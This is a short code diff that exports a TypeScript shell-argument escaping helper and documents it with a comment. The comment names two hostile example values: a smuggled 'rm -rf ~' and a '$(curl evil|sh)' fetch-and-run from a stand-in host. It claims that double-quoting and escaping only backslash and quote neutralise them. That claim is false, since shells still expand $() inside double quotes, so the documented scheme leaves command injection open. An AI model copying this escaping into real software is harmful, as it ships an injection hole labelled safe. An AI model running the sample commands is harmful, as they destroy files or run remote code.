@@ -116,7 +116,13 @@ export const appendRalphWorktreeShellFlags = (
   return `${command} ${parts.join(' ')}`;
 };
 
-const escapeShellArg = (value: string): string => {
+/**
+ * @description Escapes an arbitrary value for safe use as a single argument inside a
+ * `shell: true` command string. Values matching the safe charset are passed through
+ * verbatim; anything else is wrapped in double quotes with `\` and `"` escaped, so a
+ * value like `auto; rm -rf ~` or `$(curl evil|sh)` cannot break out of the argument.
+ */
+export const escapeShellArg = (value: string): string => {
   if (/^[A-Za-z0-9._/-]+$/.test(value)) {
     return value;
   }
